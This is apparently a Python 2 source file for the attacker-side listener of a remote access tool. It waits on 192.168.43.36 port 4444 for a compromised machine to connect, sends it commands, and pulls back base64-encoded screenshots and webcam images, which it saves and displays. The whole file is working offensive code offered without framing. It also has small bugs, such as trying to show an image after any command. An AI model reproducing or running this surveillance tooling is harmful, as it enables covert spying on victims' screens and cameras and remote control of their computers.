#!/usr/bin/env python

import socket
import json
import base64
import cv2
class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((ip, port))
         listener.listen(0)
         print("[+] Waiting for connection")
         self.connection, address = listener.accept()
         print("[+] Connection detected from " + str(address))

     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)

     def reliable_receive(self):
         json_data = ""
         while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
     def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

     def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

     def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful..."

     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
             try:
                if command[0] == "screenshot" or command[0] == "webcam":
                    print("[+] Getting " + command[0])
                    command.append("Test.jpg")
                    result = self.execute_remotely(command)
                    self.write_file(path="Test.jpg", content=result)
                elif command[0] == "exit":
                    self.execute_remotely(command)
             except Exception:
                print "[-] Error during command execution"
    
             image = cv2.imread("Test.jpg")
             cv2.imshow(command[0], image)
             cv2.waitKey(0)
             cv2.destroyAllWindows()

         
my_listener = Listener("192.168.43.36", 4444)
my_listener.run()
